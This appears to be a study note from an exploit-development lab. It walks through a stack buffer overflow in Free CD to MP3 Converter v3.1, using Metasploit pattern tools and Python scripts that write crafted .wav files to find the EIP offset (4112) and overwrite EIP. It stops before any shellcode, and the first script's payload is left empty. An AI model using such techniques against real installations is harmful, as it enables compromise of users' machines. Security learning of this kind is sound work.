# Stack Based Buffer Overflow 
##  Exploiting Free CD to MP3 Converter v3.1

> To control EIP we create a unique pattern and use a debugger to see where exactly in the unique pattern it crashes

### EIP Offset

To find a buffer we can use a unique string and send it. That way we can check at exactly what sequence it crashes.

After fuzzing to see the minimum bytes it crashes at is 5000, we can use:  
`msf-pattern_create -l 5000`

Now we can write a py script to generate the bytes into a .wav file:  
```
#create payload as processed by the program, in a buffer overflow exercise is bytes, since it will be loaded into the stack as machine code in bytes 

def eip_offset():
    payload = bytes("","utf-8") 

	with open('pattern.wav', 'wb') as f: #wb=write in bytes
        f.write(payload)

eip_offset()
```

 The value of EIP can be used to calculate the offset which in this case is `31684630`  

To calculate exact match at offset a pattern ofset tool can be used:
`msf-pattern_offset -q 31684630`  

We can now modify our script to have control over EIP
```
def eip_control():
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip
    
    with open('control.wav', 'wb') as f:
        f.write(payload)
```

As you can see EIP has been written with B's (424242)  

![](../../../Assets/Pasted%20image%2020220723010242.jpg) 

